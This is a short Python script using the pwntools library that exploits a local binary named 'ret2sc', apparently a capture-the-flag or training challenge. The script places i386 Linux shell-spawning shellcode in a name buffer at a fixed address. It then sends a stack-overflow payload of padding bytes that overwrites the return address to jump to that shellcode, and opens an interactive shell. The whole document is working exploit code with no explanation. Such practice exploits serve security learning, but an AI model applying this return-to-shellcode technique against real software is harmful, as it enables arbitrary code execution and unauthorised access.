#!usr/bin/env python 
# -*-coding:utf-8-*-
from pwn import *
# context.log_level = 'debug'
shellcode = asm(shellcraft.i386.linux.sh())
io = process("./ret2sc")
elf = ELF("./ret2sc")
io.recvuntil("Name:")
io.sendline(shellcode)
name_addr = 0x804A060

payload = 'a' * (0x1c+4) + p32(name_addr)
io.recvuntil("best:")
io.sendline(payload)
io.interactive()
io.close()
